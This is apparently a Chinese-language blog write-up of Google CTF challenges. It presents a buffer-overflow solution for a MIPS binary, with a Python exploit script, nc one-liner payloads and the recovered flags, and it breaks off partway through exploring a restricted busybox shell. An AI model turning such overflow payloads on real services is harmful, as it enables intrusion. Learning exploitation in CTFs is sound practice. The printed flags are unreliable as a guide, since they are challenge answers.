    <content type="html"><![CDATA[<h2 id="05-STOP-GAN-pwn"><a href="#05-STOP-GAN-pwn" class="headerlink" title="05 STOP GAN(pwn)"></a>05 STOP GAN(pwn)</h2><ul><li>提供buffer-overflow.ctfcompetition.com 1337</li><li>下载文件解压得到bof and console.c</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN</span><br><span class="line">╰─➤  file bof console.c</span><br><span class="line">bof:       ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped</span><br><span class="line">console.c: C <span class="built_in">source</span>, ASCII text</span><br></pre></td></tr></table></figure><ul><li>查看console.c,可以理解此程序可以crash bof 得到1st flag,进一步进行缓冲区溢出可以得到2nd flag</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 6e: bufferflow triggering segfault  - binary, compile with:</span></span><br><span class="line"><span class="comment"> * gcc /tmp/console.c -o /tmp/console -static -s</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Console allows the player to get info on the binary.</span></span><br><span class="line"><span class="comment"> * Crashing bof will trigger the 1st flag.</span></span><br><span class="line"><span class="comment"> * Controlling the buffer overflow in bof will trigger the 2nd flag.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">char</span> inputs[<span class="number">256</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &#x27;run&#x27; command.\n Bonus flag for controlling the crash.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nConsole commands: \nrun\nquit\n&gt;&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fgets(inputs, <span class="number">256</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Inputs: %s&quot;</span>, inputs);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(inputs, <span class="string">&quot;run\n\0&quot;</span>, <span class="number">256</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">      <span class="keyword">int</span> result = system(<span class="string">&quot;/usr/bin/qemu-mipsel-static ./bof&quot;</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(inputs, <span class="string">&quot;quit\n\0&quot;</span>, <span class="number">256</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Unable to determine action from your input&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编译console.c 得到console（由于/usr/bin/qemu-mipsel-static: not found，程序无法正常执行。此问题原因后续研究）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜ 04_STOP GAN gcc console.c -o console -static -s</span><br><span class="line">➜ 04_STOP GAN ./console</span><br><span class="line">Your goal: try to crash the Cauliflower system by providing input to the program <span class="built_in">which</span> is launched by using <span class="string">&#x27;run&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line"> Bonus flag <span class="keyword">for</span> controlling the crash.</span><br><span class="line"></span><br><span class="line">Console commands:</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">&gt;&gt;run</span><br><span class="line">Inputs: run</span><br><span class="line">sh: 1: /usr/bin/qemu-mipsel-static: not found</span><br><span class="line"></span><br><span class="line">Console commands:</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><ul><li>利用netcat连接给定的网址，可运行远程console</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜ 04_STOP GAN nc -v buffer-overflow.ctfcompetition.com 1337</span><br><span class="line">Connection to buffer-overflow.ctfcompetition.com 1337 port [tcp/*] succeeded!</span><br><span class="line">Your goal: try to crash the Cauliflower system by providing input to the program <span class="built_in">which</span> is laun</span><br><span class="line">ched by using <span class="string">&#x27;run&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line"> Bonus flag <span class="keyword">for</span> controlling the crash.</span><br><span class="line">Console commands:</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">&gt;&gt;run</span><br><span class="line">Inputs: run</span><br><span class="line">aaaaaaaaaaaaaaaaaaa</span><br><span class="line">Cauliflower systems never crash &gt;&gt;</span><br></pre></td></tr></table></figure><ul><li>由于长度没有达到溢出要求，可以看到随意一串字符串并没有带来crash</li><li>利用python生成长字符串达成crash</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN</span><br><span class="line">╰─➤   python3 -c <span class="string">&quot;print (&#x27;run\n&#x27; + &#x27;a&#x27;*268)&quot;</span> | nc buffer-overflow.ctfcompetition.com 1337</span><br><span class="line">Your goal: try to crash the Cauliflower system by providing input to the program <span class="built_in">which</span> is launched by using <span class="string">&#x27;run&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line"> Bonus flag <span class="keyword">for</span> controlling the crash.</span><br><span class="line"></span><br><span class="line">Console commands:</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">&gt;&gt;Inputs: run</span><br><span class="line">CTF&#123;Why_does_cauliflower_threaten_us&#125;</span><br><span class="line">Cauliflower systems never crash &gt;&gt;</span><br><span class="line">segfault detected! ***CRASH***</span><br><span class="line">Console commands:</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><ul><li>==<strong>1st flag:CTF{Why_does_cauliflower_threaten_us}</strong>==</li><li>为了得到2ed flag， need Controlling the buffer overflow in bof</li><li>找到local_flag function(利用IDA逆向工具也可查看到此函数)，地址范围0x400840-0x400890</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN</span><br><span class="line">╰─➤  nm bof | grep <span class="string">&quot;flag&quot;</span></span><br><span class="line">0049ffc0 D _dl_stack_flags</span><br><span class="line">00400840 t local_flag</span><br></pre></td></tr></table></figure><ul><li>当长度为265时,程序爆出提示，说明指针进行了一次跳转</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN</span><br><span class="line">╰─➤  python3 -c <span class="string">&quot;print (&#x27;run\n&#x27; + &#x27;a&#x27;*265)&quot;</span> | nc buffer-overflow.ctfcompetition.com 1337</span><br><span class="line">Your goal: try to crash the Cauliflower system by providing input to the program <span class="built_in">which</span> is launched by using <span class="string">&#x27;run&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line"> Bonus flag <span class="keyword">for</span> controlling the crash.</span><br><span class="line"></span><br><span class="line">Console commands:</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">&gt;&gt;Inputs: run</span><br><span class="line">qemu: uncaught target signal 4 (Illegal instruction) - core dumped</span><br><span class="line">Illegal instruction (core dumped)</span><br></pre></td></tr></table></figure><ul><li>通过实验得到：offset为264字节的填充字符串，加上4字节返回地址，可以将返回指针设定到local_flag函数地址0x400850(对于MIPS的指令调试不熟悉，但buffer-overflow的原理类似，可以参见<a href="https://ctftime.org/writeup/15933%E8%AE%B2%E8%A7%A3)%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8local_flag%E5%9C%B0%E5%9D%80%E8%8C%83%E5%9B%B4%E5%86%85%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">https://ctftime.org/writeup/15933讲解)，可以在local_flag地址范围内一次尝试</a></li><li>编写exlpoit.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">        padding = <span class="string">&quot;\x41&quot;</span> * <span class="number">264</span></span><br><span class="line">        address = <span class="string">&quot;\x50\x08\x40&quot;</span></span><br><span class="line">        payload = padding + address + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET,socket.SOCK_STREAM) <span class="keyword">as</span> soc:</span><br><span class="line">                soc.connect((<span class="string">&quot;buffer-overflow.ctfcompetition.com&quot;</span>,<span class="number">1337</span>))</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">                soc.recv(<span class="number">1024</span>)</span><br><span class="line">                soc.send(<span class="string">&quot;run\n&quot;</span>.encode())</span><br><span class="line">                soc.send(payload.encode())</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">                print(soc.recv(<span class="number">1024</span>).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN</span><br><span class="line">╰─➤  ./exploit.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Console commands:</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">&gt;&gt;Inputs: run</span><br><span class="line">CTF&#123;controlled_crash_causes_conditional_correspondence&#125;</span><br><span class="line">Cauliflower systems never crash &gt;&gt;</span><br><span class="line"></span><br><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN</span><br><span class="line">╰─➤  python3 -c <span class="string">&quot;print (&#x27;run\n&#x27; + &#x27;a&#x27;*264 +&#x27;\x50\x08\x40&#x27;)&quot;</span> | nc buffer-overflow.ctfcompetition.com 1337</span><br><span class="line">Your goal: try to crash the Cauliflower system by providing input to the program <span class="built_in">which</span> is launched by using <span class="string">&#x27;run&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line"> Bonus flag <span class="keyword">for</span> controlling the crash.</span><br><span class="line"></span><br><span class="line">Console commands:</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">&gt;&gt;Inputs: run</span><br><span class="line">CTF&#123;controlled_crash_causes_conditional_correspondence&#125;</span><br><span class="line">Cauliflower systems never crash &gt;&gt;</span><br></pre></td></tr></table></figure><ul><li>==<strong>2nd flag:CTF{controlled_crash_causes_conditional_correspondence}</strong>==</li></ul><h2 id="06-Work-Computer-sandbox"><a href="#06-Work-Computer-sandbox" class="headerlink" title="06 Work Computer(sandbox)"></a>06 Work Computer(sandbox)</h2><ul><li>netcat connect :readme.ctfcompetition.com 1337</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/05_Work</span><br><span class="line">╰─➤  nc readme.ctfcompetition.com 1337</span><br><span class="line"></span><br><span class="line">&gt; ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxrwxrwt    2 0        0               80 Sep 20 14:05 .</span><br><span class="line">drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..</span><br><span class="line">----------    1 1338     1338            33 Sep 20 14:05 ORME.flag</span><br><span class="line">-r--------    1 1338     1338            28 Sep 20 14:05 README.flag</span><br><span class="line">&gt; cat README.flag</span><br><span class="line">error: No such file or directory</span><br><span class="line">&gt; more README.flag</span><br><span class="line">error: No such file or directory</span><br><span class="line">&gt; vim README.flag</span><br><span class="line">error: No such file or directory</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><ul><li>发现命令均失效，查看/bin /sbin /usr/bin /usr/sbin,大部分命令均被busybox限制</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; busybox</span><br><span class="line">busybox can not be called <span class="keyword">for</span> alien reasons.</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line">[H[J</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">******************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">****ALIEN SHELL****</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">******************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER is: @(null)</span><br><span class="line">[H[J&gt; total 808</span><br><span class="line">drwxr-xr-x    2 65534    65534         4096 Jun 13 14:28 .</span><br><span class="line">drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 arch -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534       796240 Jan 24  2019 busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chgrp -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chown -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 conspy -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 date -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 df -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dmesg -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dnsdomainname -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dumpkmap -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 echo -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 false -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fdflush -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fsync -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 getopt -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 hostname -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ionice -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iostat -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcalc -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 kill -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 login -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ls -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzop -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 makemime -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkdir -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mknod -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mktemp -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mount -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mountpoint -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mpstat -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 netstat -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nice -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pidof -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ping -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ping6 -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pipe_progress -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 printenv -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ps -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pwd -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 reformime -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 rm -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 rmdir -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 run-parts -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setpriv -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setserial -&gt; /bin/busybox</span><br><span class="line">-r-sr-xr-x    1 1338     1338         19936 Jun 13 12:48 shell</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sleep -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 stat -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 stty -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sync -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 tar -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 true -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 umount -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 uname -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 usleep -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 watch -&gt; /bin/busybox</span><br><span class="line">&gt; total 236</span><br><span class="line">drwxr-xr-x    2 65534    65534         4096 May  9 20:49 .</span><br><span class="line">drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 